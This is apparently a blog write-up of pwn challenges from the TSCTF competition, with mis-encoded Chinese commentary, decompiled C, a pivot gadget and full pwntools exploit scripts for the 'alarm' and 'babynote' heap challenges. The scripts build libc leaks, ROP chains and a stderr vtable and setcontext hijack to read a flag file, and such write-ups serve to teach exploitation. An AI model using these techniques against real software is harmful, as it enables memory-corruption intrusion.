          <h1 id="TSCTF-pwn"><a href="#TSCTF-pwn" class="headerlink" title="TSCTF pwn"></a>TSCTF pwn</h1><p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220425124307333.png" alt="image-20220425124307333"></p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220425124334437.png" alt="image-20220425124334437"></p>
<h2 id="0x1-alarm"><a href="#0x1-alarm" class="headerlink" title="0x1 alarm"></a>0x1 alarm</h2><p>ä¸»è¦æ¼æ´å‡ºç°åœ¨å †çš„ç”³è¯·ä¸Šï¼Œå¯ä»¥ç”³è¯·17ä¸ªå †ï¼Œç„¶åè¦†ç›–editå‡½æ•°çš„åç§»å€¼ï¼ŒæŠŠè¿™ä¸ªåç§»å€¼æ”¹æˆè´Ÿæ•°å°±å¯ä»¥å‘ä¸Šè¦†ç›–gotè¡¨äº†ï¼Œæˆ‘æ²¡åšå‡ºæ¥çš„ä¸»è¦åŸå› æ˜¯æˆ‘ä»¥ä¸ºè¿™ä¸ªåç§»å€¼æ˜¯å­—ç¬¦çš„è¾“å…¥ä¸ªæ•°</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_2AF7</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int16 v1; <span class="comment">// ax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)dword_5520;</span><br><span class="line">  <span class="keyword">if</span> ( (__int16)dword_5520 &lt;= <span class="number">7</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = dword_5520++;</span><br><span class="line">    v2 = <span class="built_in">std</span>::<span class="built_in">string</span>::<span class="keyword">operator</span>[](&amp;unk_53E0, v1);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">std</span>::<span class="keyword">operator</span>&gt;&gt;&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>, v2);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨ayoungä½¬è¿™é‡Œå­¦åˆ°ä¸€ä¸ªå¾ˆå¥½ç”¨çš„gadgetæ¥ç»•è¿‡æ²™ç®±è¿›è¡Œrop</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sub    rsp, 0x18</span><br><span class="line">mov    rbp, qword ptr [rdi + 0x48]</span><br><span class="line">mov    rax, qword ptr [rbp + 0x18]</span><br><span class="line">lea    r13, [rbp + 0x10]</span><br><span class="line">mov    dword ptr [rbp + 0x10], 0</span><br><span class="line">mov    rdi, r13</span><br><span class="line">call   qword ptr [rax + 0x28]</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªgadgetçš„ä¸»è¦ä½œç”¨å°±æ˜¯é€šè¿‡rdiæ§åˆ¶rbpç„¶åå†è·³ä¸€ä¸ªleave_retå°±å¯ä»¥æ§åˆ¶rspæ¥å®Œæˆropäº†</p>
<p>è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh=process([<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/ld-2.31.so&#x27;</span>, <span class="string">&#x27;./pwn&#x27;</span>], env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc-2.31.so&#x27;</span>&#125;)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span>(<span class="params">name,pwd</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;username: &quot;</span>)</span><br><span class="line">    sh.sendline(name)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;password: &quot;</span>)</span><br><span class="line">    sh.sendline(pwd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;chose &gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;size &gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx,choice</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;chose &gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;idx &gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Sure delete ?&quot;</span>)</span><br><span class="line">    sh.send(choice)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;chose &gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bye</span>(<span class="params">content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;chose &gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;byebye, good night~\n&quot;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line">duan=<span class="string">&quot;b *(0x7ffff7fc5000+&#123;0&#125;)&quot;</span>.<span class="built_in">format</span>(<span class="number">0x2B7D</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh,duan)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    init(<span class="string">&quot;rootroot&quot;</span>,<span class="string">&quot;#$%^&amp;*!@&quot;</span>)</span><br><span class="line">    add(<span class="number">0x500</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">        add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0xfcf0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    edit(<span class="string">&#x27;\xc9&#x27;</span>)</span><br><span class="line">    free(<span class="number">0</span>,<span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line">    free(<span class="number">1</span>,<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">    bye(<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    libc_addr=u64(sh.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x1ed000</span></span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(libc_addr)</span><br><span class="line">    free(<span class="number">1</span>,<span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line">    bye(<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    heap_addr=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x13b00</span></span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(heap_addr)</span><br><span class="line">    add(<span class="number">0xfc60</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    heap_17_addr=<span class="number">0x24fc0</span>+heap_addr</span><br><span class="line">    <span class="comment">#0x000000000008e1c4: mov esp, eax; mov rax, r12; pop r12; ret;</span></span><br><span class="line">    gadget=libc_addr+<span class="number">0x154d06</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        content=gadget&amp;<span class="number">0xff</span></span><br><span class="line">        gadget=gadget&gt;&gt;<span class="number">8</span></span><br><span class="line">        edit(p8(content))</span><br><span class="line">    heap_rop_addr=<span class="number">0x142d0</span>+heap_addr</span><br><span class="line">    pop_rdi=<span class="number">0x0000000000023b72</span>+libc_addr</span><br><span class="line">    pop_rsi=libc_addr+<span class="number">0x000000000002604f</span></span><br><span class="line">    pop_rdx_r12=<span class="number">0x0000000000119241</span>+libc_addr</span><br><span class="line">    syscall_ret=<span class="number">0x00000000000630d9</span>+libc_addr</span><br><span class="line">    pop_rax=<span class="number">0x0000000000047400</span>+libc_addr</span><br><span class="line">    leave_ret=libc_addr+<span class="number">0x00000000000578f8</span></span><br><span class="line"></span><br><span class="line">    rop=p64(heap_rop_addr)+p64(pop_rdx_r12)</span><br><span class="line">    rop+=p64(<span class="number">0</span>)+p64(heap_rop_addr)</span><br><span class="line">    rop+=p64(pop_rdi)+p64(leave_ret)</span><br><span class="line">    rop+=p64(pop_rax)+p64(<span class="number">2</span>)</span><br><span class="line">    rop+=p64(pop_rdi)+p64(heap_rop_addr)</span><br><span class="line">    rop+=p64(pop_rdi)+p64(heap_rop_addr+<span class="number">0xe8</span>)</span><br><span class="line">    rop+=p64(pop_rsi)+p64(<span class="number">0</span>)</span><br><span class="line">    rop+=p64(pop_rdx_r12)+p64(<span class="number">0</span>)</span><br><span class="line">    rop+=p64(<span class="number">0</span>)+p64(syscall_ret)</span><br><span class="line">    rop+=p64(pop_rdi)+p64(<span class="number">3</span>)</span><br><span class="line">    rop+=p64(pop_rsi)+p64(heap_rop_addr+<span class="number">0x200</span>)</span><br><span class="line">    rop+=p64(pop_rdx_r12)+p64(<span class="number">0x30</span>)</span><br><span class="line">    rop+=p64(<span class="number">0x30</span>)+p64(libc_addr+libc.sym[<span class="string">&quot;read&quot;</span>])</span><br><span class="line">    rop+=p64(pop_rdi)+p64(heap_rop_addr+<span class="number">0x200</span>)</span><br><span class="line">    rop+=p64(libc_addr+libc.sym[<span class="string">&quot;puts&quot;</span>])+<span class="string">&#x27;./flag\x00\x00&#x27;</span></span><br><span class="line">    bye(rop)</span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h2 id="0x2-babynote"><a href="#0x2-babynote" class="headerlink" title="0x2 babynote"></a>0x2 babynote</h2><p>ä¸»è¦é—®é¢˜å‡ºç°åœ¨äº†æ‹·è´å‡½æ•°memcpyä¸Šï¼Œåˆ©ç”¨åŠ å¯†å‡½æ•°å’Œreadå‡½æ•°é…åˆæ¥å®Œæˆå †çš„æº¢å‡ºæ‹·è´ï¼Œç„¶åä½¿ç”¨äº†ç„¶åæŠŠstderrçš„vtableè¦†ç›–æˆ<code>io_str_jumps</code>,ä¿®æ”¹stderrç»“æ„ä½“çš„å†…å®¹ï¼Œè®©stderr+0x28å¡«ä¸Šè‡ªå·±æƒ³å¡«çš„åœ°å€ï¼Œç„¶åå…¶ä»–å…¨å¡«0ï¼Œè¿™æ ·çš„è¯ï¼Œæœ€åexitå°±ä¼šæ‰§è¡Œstderrçš„io_str_overflow,è¿™ä¸ªå‡½æ•°ä¼š<code>call malloc</code>è¿™æ—¶å€™ç¨‹åºçš„rdxæŒ‡é’ˆæ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„äº†ï¼Œå…·ä½“å’Œstderr+0x28ç›¸å…³ï¼Œç„¶åæŠŠmalloc_hookè¦†ç›–æˆsetcontextå°±å¯ä»¥æ§åˆ¶rspå®Œæˆropäº†ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh=remote(<span class="string">&quot;10.7.2.133&quot;</span>,<span class="number">34789</span>)</span><br><span class="line"><span class="comment">#sh=process([&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/ld-2.31.so&#x27;, &#x27;./pwn&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc-2.31.so&#x27;&#125;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_note</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sh.sendafter(<span class="string">&quot;content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_note</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrype_note</span>(<span class="params">idx,key</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.sendafter(<span class="string">&quot;encrypt key: &quot;</span>,key)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_note</span>(<span class="params">i,idx,key=<span class="number">0</span></span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    <span class="keyword">if</span> i==<span class="number">1</span>:</span><br><span class="line">        sh.sendafter(<span class="string">&quot;encrypt key: &quot;</span>,key)</span><br><span class="line">    </span><br><span class="line">duan=<span class="string">&quot;b *(0x7ffff7fc5000+&#123;0&#125;)&quot;</span>.<span class="built_in">format</span>(<span class="number">0x1747</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh,duan)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    rand=<span class="number">0xa6381cc</span></span><br><span class="line">    pay=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0xf8</span>-<span class="number">8</span>-<span class="number">3</span>)+p64(<span class="number">0x481</span>)</span><br><span class="line">    write_note(<span class="number">0xf8</span>,pay+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">        write_note(<span class="number">0x70</span>,<span class="string">&#x27;a\n&#x27;</span>)</span><br><span class="line">    key=<span class="string">&#x27;:&#x27;</span>.ljust(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    encrype_note(<span class="number">0</span>,key)</span><br><span class="line">    key=p32(rand)+<span class="string">&#x27;:&#x27;</span>.ljust(<span class="number">0xa</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    read_note(<span class="number">1</span>,<span class="number">0</span>,key)</span><br><span class="line">    delete_note(<span class="number">1</span>)</span><br><span class="line">    write_note(<span class="number">0x70</span>,<span class="string">&#x27;\a\n&#x27;</span>)</span><br><span class="line">    read_note(<span class="number">0</span>,<span class="number">2</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">    libc_base=u64(sh.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x1ecbe0</span></span><br><span class="line">    ret=<span class="number">0x0000000000022679</span>+libc_base</span><br><span class="line">    pop_rdi=<span class="number">0x0000000000023b72</span>+libc_base</span><br><span class="line">    pop_rsi=<span class="number">0x000000000002604f</span>+libc_base</span><br><span class="line">    pop_rdx_r12=<span class="number">0x0000000000119241</span>+libc_base</span><br><span class="line">    syscall_ret=<span class="number">0x00000000000630d9</span>+libc_base</span><br><span class="line">    pop_rax=<span class="number">0x0000000000047400</span>+libc_base</span><br><span class="line">    add_rsp_0x20_pop_rdx=<span class="number">0x0000000000042b71</span>+libc_base</span><br><span class="line">    write_note(<span class="number">0x70</span>,<span class="string">&#x27;\a\n&#x27;</span>)</span><br><span class="line">    delete_note(<span class="number">11</span>)</span><br><span class="line">    delete_note(<span class="number">2</span>)</span><br><span class="line">    read_note(<span class="number">0</span>,<span class="number">12</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">    heap_base=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x18a0</span></span><br><span class="line">    write_note(<span class="number">0x70</span>,<span class="string">&#x27;a\n&#x27;</span>)</span><br><span class="line">    write_note(<span class="number">0x70</span>,<span class="string">&#x27;a\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        delete_note(<span class="number">4</span>+i)</span><br><span class="line">    delete_note(<span class="number">2</span>)</span><br><span class="line">    delete_note(<span class="number">11</span>)</span><br><span class="line">    delete_note(<span class="number">12</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        write_note(<span class="number">0x70</span>,<span class="string">&#x27;a\n&#x27;</span>)</span><br><span class="line">    stderr=libc_base+<span class="number">0x1ed5c0</span></span><br><span class="line">    write_note(<span class="number">0x70</span>,p64(stderr-<span class="number">0x10</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    write_note(<span class="number">0x70</span>,<span class="string">&#x27;a\n&#x27;</span>)</span><br><span class="line">    write_note(<span class="number">0x70</span>,<span class="string">&#x27;a\n&#x27;</span>)</span><br><span class="line">    setcontext_addr=libc_base+libc.sym[<span class="string">&quot;setcontext&quot;</span>]</span><br><span class="line">    pay=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x10</span>+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x28</span>+p64(stderr+<span class="number">0x10</span>)</span><br><span class="line">    pay=pay.ljust(<span class="number">0x70</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    write_note(<span class="number">0x70</span>,pay)</span><br><span class="line">    </span><br><span class="line">    io_str_jumps_addr=libc_base+<span class="number">0x1e9560</span></span><br><span class="line"></span><br><span class="line">    delete_note(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        delete_note(<span class="number">4</span>+i)</span><br><span class="line">    delete_note(<span class="number">10</span>)</span><br><span class="line">    delete_note(<span class="number">11</span>)</span><br><span class="line">    delete_note(<span class="number">12</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        write_note(<span class="number">0x70</span>,<span class="string">&#x27;a\n&#x27;</span>)</span><br><span class="line">    write_note(<span class="number">0x70</span>,p64(stderr+<span class="number">0xb0</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    write_note(<span class="number">0x70</span>,<span class="string">&#x27;a\n&#x27;</span>)</span><br><span class="line">    write_note(<span class="number">0x70</span>,<span class="string">&#x27;a\n&#x27;</span>)</span><br><span class="line">    pay=p64(heap_base+<span class="number">0x1620</span>)+p64(ret)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(io_str_jumps_addr)</span><br><span class="line">    write_note(<span class="number">0x70</span>,pay+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    delete_note(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        delete_note(<span class="number">4</span>+i)</span><br><span class="line">    delete_note(<span class="number">10</span>)</span><br><span class="line">    delete_note(<span class="number">11</span>)</span><br><span class="line">    delete_note(<span class="number">12</span>)</span><br><span class="line">    payload1=p64(pop_rax)+p64(<span class="number">2</span>)+p64(pop_rdi)+p64(heap_base+<span class="number">0x16a0</span>)</span><br><span class="line">    payload1+=p64(pop_rdx_r12)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(syscall_ret)</span><br><span class="line">    payload1+=p64(pop_rax)+p64(<span class="number">0</span>)+p64(add_rsp_0x20_pop_rdx)</span><br><span class="line"></span><br><span class="line">    payload2=<span class="string">&quot;./flag\x00\x00&quot;</span>+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(<span class="number">3</span>)+p64(pop_rsi)+p64(heap_base+<span class="number">0x2000</span>)+p64(pop_rdx_r12)</span><br><span class="line">    payload2+=p64(<span class="number">0x30</span>)*<span class="number">2</span>+p64(syscall_ret)+p64(pop_rdi)+p64(heap_base+<span class="number">0x2000</span>)+p64(libc_base+libc.sym[<span class="string">&quot;puts&quot;</span>])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        write_note(<span class="number">0x70</span>,payload2+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        write_note(<span class="number">0x70</span>,payload1+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    write_note(<span class="number">0x70</span>,p64(libc_base+libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>])+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    write_note(<span class="number">0x70</span>,<span class="string">&#x27;a\n&#x27;</span>)</span><br><span class="line">    write_note(<span class="number">0x70</span>,<span class="string">&#x27;a\n&#x27;</span>)</span><br><span class="line">    write_note(<span class="number">0x70</span>,p64(setcontext_addr+<span class="number">61</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(sh)</span></span><br><span class="line">    delete_note(<span class="number">0</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;size: &quot;</span>,<span class="built_in">str</span>(<span class="number">0x100</span>))</span><br><span class="line">    <span class="built_in">print</span> sh.recv()</span><br><span class="line">    sh.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h2 id="0x3-å¿˜äº†å«å•¥å"><a href="#0x3-å¿˜äº†å«å•¥å" class="headerlink" title="0x3 å¿˜äº†å«å•¥å"></a>0x3 å¿˜äº†å«å•¥å</h2><p>ä»»æ„æ–‡ä»¶è¯»åŠ æº¢å‡ºioæŒ‡é’ˆå®Œæˆgetshell</p>
